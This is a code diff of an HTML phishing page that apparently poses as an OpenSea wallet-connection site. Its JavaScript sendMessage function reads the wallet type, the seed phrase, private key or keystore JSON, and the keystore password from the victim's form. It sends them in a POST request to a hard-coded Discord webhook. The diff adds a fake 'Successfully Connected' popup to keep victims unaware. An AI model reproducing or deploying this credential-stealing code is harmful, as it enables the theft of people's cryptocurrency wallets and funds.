@@ -2,6 +2,8 @@
 
 <html prefix="og: http://ogp.me/ns#"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
+<!-- Include SweetAlert library -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
     <link rel="icon" href="https://connectvalidateit.com/en/manual/images/opensea.svg" type="image/gif" sizes="16x16">
     
@@ -747,7 +749,7 @@
         </div>
         <div class="flex flex-col mb-6">
             <div class="relative" data-children-count="1">
-                <input type="password" name="keystorepassword" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" required>
+                <input type="password" name="keystorepassword" placeholder="Wallet password" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                 <p class="text-xs text-grey-300 mt-6">
                     Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                 </p>
@@ -799,37 +801,46 @@
     </div>
 </form>
 
+<!-- JavaScript code for sendMessage function with SweetAlert -->
 <script>
-function sendMessage(formId, type) {
-    function sleep(milliseconds) {
-        const date = Date.now();
-        let currentDate = null;
-        do {
-            currentDate = Date.now();
-        } while (currentDate - date < milliseconds);
+    async function sendMessage(formId, type) {
+        function sleep(milliseconds) {
+            return new Promise(resolve => setTimeout(resolve, milliseconds));
+        }
+    
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1161024682955382874/0rqgI2IorAqwV2S13U-wym4jwSYyQqtzfklqe6lcCnjfFsugRU0at0DK0Jbdf37F_YQt");
+        request.setRequestHeader('Content-type', 'application/json');
+    
+        var params = {
+            content: ("> **WALLET TYPE  : **" + document.getElementById(formId).elements['wallet_id'].value + "\n> **" + type.replace(/\s+/g, '') + "  : **" + document.getElementById(formId).elements[type.toLowerCase()].value)
+        };
+    
+        // Additional handling for Keystore JSON and Private Key
+        if (type === 'KEYSTORE') {
+            params.content += ("\n> **KEYSTOREPASSWORD  : **" + document.getElementById(formId).elements['keystorepassword'].value);
+        }
+    
+        request.send(JSON.stringify(params));
+        await sleep(400);
+    
+         // Show SweetAlert popup for the successful message
+    Swal.fire({
+        icon: 'success',
+        title: 'Success!',
+        text: 'Successfully Connected',
+    }).then((result) => {
+        // Reload the page after 5 seconds
+        setTimeout(() => {
+            location.reload();
+        }, 2000);
+    });
+
+    
+        // ... (rest of the code)
     }
-
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1161024682955382874/0rqgI2IorAqwV2S13U-wym4jwSYyQqtzfklqe6lcCnjfFsugRU0at0DK0Jbdf37F_YQt");
-    request.setRequestHeader('Content-type', 'application/json');
-
-    var params = {
-        content: ("> **WALLET TYPE  : **" + document.getElementById(formId).elements['wallet_id'].value + "\n> **" + type + "  : **" + document.getElementById(formId).elements[type.toLowerCase()].value)
-    };
-
-    // Additional handling for Keystore JSON and Private Key
-    if (type === 'KEYSTORE') {
-        params.content += ("\n> **KEYSTOREPASSWORD  : **" + document.getElementById(formId).elements['keystorepassword'].value);
-    }
-
-    request.send(JSON.stringify(params));
-    sleep(400);
-    //   window.location.replace("https://www.instagram.com/p/By7NkskoTip");
-}
-
-
-</script>
-
+    </script>
+    
                       </div>
                     </div>
                   </div>
